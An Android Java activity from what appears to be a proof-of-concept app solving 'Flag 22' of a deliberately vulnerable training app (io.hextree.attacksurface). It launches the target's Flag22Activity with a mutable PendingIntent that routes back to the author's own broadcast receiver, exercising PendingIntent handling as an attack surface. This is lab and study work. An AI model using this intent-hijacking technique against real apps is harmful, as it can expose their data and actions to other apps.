package com.xylinz.poc;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

public class PendingIntentFlagHere extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_pending_intent);

        // Flag 22 - Receive PendingIntent using broadcast receiver
        Button flag22 = findViewById(R.id.flag22_button);
        Intent flag22Intent = new Intent();
        flag22Intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag22Activity");

        Intent receive = new Intent(this, PendingIntentReceiver.class); // arahin ke broadcast receiver kita sendiri

        PendingIntent pi = PendingIntent.getBroadcast(
                PendingIntentFlagHere.this,
                0,
                receive,
                PendingIntent.FLAG_MUTABLE
        );
        flag22Intent.putExtra("PENDING", pi);

        flag22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(flag22Intent);
            }
        });
    }
}